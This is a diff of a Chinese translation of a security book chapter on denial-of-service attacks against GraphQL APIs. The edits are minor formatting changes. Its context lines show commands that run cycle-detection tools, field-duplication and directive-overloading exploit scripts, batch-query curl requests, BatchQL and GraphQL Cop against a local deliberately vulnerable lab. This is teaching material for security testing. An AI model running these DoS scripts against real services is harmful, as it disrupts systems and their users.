@@ -1,6 +1,4 @@
-# 5
-
-拒绝服务攻击
+# 拒绝服务攻击
 
 ![](img/chapterart.png)
 
@@ -195,7 +193,7 @@ GraphQL Voyager 会高亮显示自定义对象类型，如 `OwnerObject` 和 `Pa
 接下来，打开终端。为了执行循环查询检查，我们将传递三个标志给 InQL：`-f` 标志，用于使用我们下载的 JSON 文件；`--generate-cycles` 标志，用于执行循环查询检测检查；以及 `-o` 标志，用于将输出写入指定的文件夹。以下命令将这些标志组合起来执行循环查询检测：
 
 ```
-# **inql -f /home/kali/introspection_query.json --generate-cycles -o dvga_cycles**
+# inql -f /home/kali/introspection_query.json --generate-cycles -o dvga_cycles
 [!] Parsing local schema file
 [+] Writing Introspection Schema JSON
 [+] Writing query Templates
@@ -210,7 +208,7 @@ Writing createPaste mutation
 检查完成后，你会注意到 InQL 创建了一个*dvga_cycles*文件夹。在此文件夹中，寻找一个以*cycles*为开头的文本文件；该文件将包含脚本执行的结果。你可以运行以下命令查看检查结果：
 
 ```
-# **cat dvga_cycles/introspection_query/cycles***
+# cat dvga_cycles/introspection_query/cycles*
 
 Cycles(
         { OwnerObject -[paste]-> PasteObject -[owner]-> OwnerObject }
@@ -227,7 +225,7 @@ InQL 能够在架构中找到存在循环关系的路径，特别是在`PasteObj
 InQL 还可以通过直接连接到 GraphQL API 并获取内部信息来运行相同的检查。为此，使用`-t`标志来指定目标：
 
 ```
-# **inql -t http://localhost:5013/graphql --generate-cycles -o dvga_cycles**
+# inql -t http://localhost:5013/graphql --generate-cycles -o dvga_cycles
 [+] Writing Introspection Schema JSON
 [+] DONE
 Writing pastes query
@@ -240,9 +238,9 @@ Writing importPaste mutation
 `-t`选项允许我们在有多个主机列表需要测试时，扩展此检查。示例 5-2 展示了如何将主机添加到名为*hosts.txt*的文件中。
 
 ```
-# **cd ~**
-# **echo 'http://localhost:5013/graphql' > hosts.txt**
-# **cat hosts.txt**
+# cd ~
+# echo 'http://localhost:5013/graphql' > hosts.txt
+# cat hosts.txt
 http://localhost:5013/graphql
 ```
 
@@ -526,7 +524,7 @@ THREADS = 50
 你可以下载这个漏洞，并使用以下命令在 DVGA 上运行它。请注意，在运行时，你的机器可能会出现性能下降：
 
 ```
-# **python3 exploit_threaded_field_dup.py http://localhost:5013/graphql**
+# python3 exploit_threaded_field_dup.py http://localhost:5013/graphql
 ```
 
 由于该漏洞使用了无限循环，它不会自行停止；你可以通过按下 CTRL-C 发送*SIGINT*信号来终止它。
@@ -576,7 +574,7 @@ query {
 如果你需要生成数百个查询，可以在终端中使用简短的 Python 脚本以编程方式构建查询，如列表 5-8 所示。
 
 ```
-# **python3 -c 'for i in range(0, 10): print("q"+str(i)+":"+"systemUpdate")'**
+# python3 -c 'for i in range(0, 10): print("q"+str(i)+":"+"systemUpdate")'
 
 q0:systemUpdate
 q1:systemUpdate
@@ -662,7 +660,7 @@ query {
 以下命令在命令行中运行攻击：
 
 ```
-# **python3 exploit_directive_overloading.py http://localhost:5013/graphql 30000**
+# python3 exploit_directive_overloading.py http://localhost:5013/graphql 30000
 ```
 
 列表 5-11 显示了主要的攻击代码。
@@ -780,7 +778,7 @@ SELECT content FROM pastes WHERE public = true LIMIT 100000
 列表 5-12 中的命令使用 cURL 发送一个查询数组。
 
 ```
-# **curl http://localhost:5013/graphql -H "Content-Type: application/json"**
+# curl http://localhost:5013/graphql -H "Content-Type: application/json"
 **-d '[{"query":"query {systemHealth}"},{"query":"query {systemHealth}"}]'**
 
 [
@@ -819,8 +817,8 @@ print(r.json())
 将文件保存到桌面并运行以下命令：
 
 ```
-# **cd ~/Desktop**
-# **python3 array_based_batch_query.py**
+# cd ~/Desktop
+# python3 array_based_batch_query.py
 
 [
    {'data': {'systemHealth': 'System Load: 1.49\n'}},
@@ -894,7 +892,7 @@ print(r.json())
 我们鼓励你在实验室中运行这个脚本，看看它是如何工作的！将脚本下载到你的实验室环境中，并在运行前设置可执行权限（`+x`）：
 
 ```
-# **python3 array_based_circular_queries.py**
+# python3 array_based_circular_queries.py
 
 Query: query {pastes { owner { `...` } } }
 Query Repeated: 10 times
@@ -931,8 +929,8 @@ try:
 现在让我们尝试在 DVGA 上运行 BatchQL，看看我们会得到什么样的输出。使用`-e`标志来指定 GraphQL 端点：
 
 ```
-# **cd BatchQL**
-# **python3 batch.py -e http://localhost:5013/graphql**
+# cd BatchQL
+# python3 batch.py -e http://localhost:5013/graphql
 
 CSRF GET based successful. Please confirm that this is a valid issue.
 CSRF POST based successful. Please confirm that this is a valid issue.
@@ -949,8 +947,8 @@ BatchQL 能够检测到基于数组的批处理和基于别名的批处理都可
 GraphQL Cop 需要非常少的参数来完成其工作。要执行审计，请使用以下命令运行它：
 
 ```
-# **cd ~/graphql-cop**
-# **python3 graphql-cop.py -t http://localhost:5013/graphql**
+# cd ~/graphql-cop
+# python3 graphql-cop.py -t http://localhost:5013/graphql
 
                     GraphQL Cop
            Security Auditor for GraphQL
@@ -1179,7 +1177,7 @@ def resolve_pastes(self, info, public=False):
 要生成任何查询的 SHA-256 哈希值，您可以使用`sha256sum`命令，如下所示：
 
 ```
-# **echo -n "{query{pastes{owner{id}}}}" | sha256sum**
+# echo -n "{query{pastes{owner{id}}}}" | sha256sum
 
 5e734424cfdde58851234791dea3811caf8e8b389cc3aw7035044ce91679757bc8
 ```
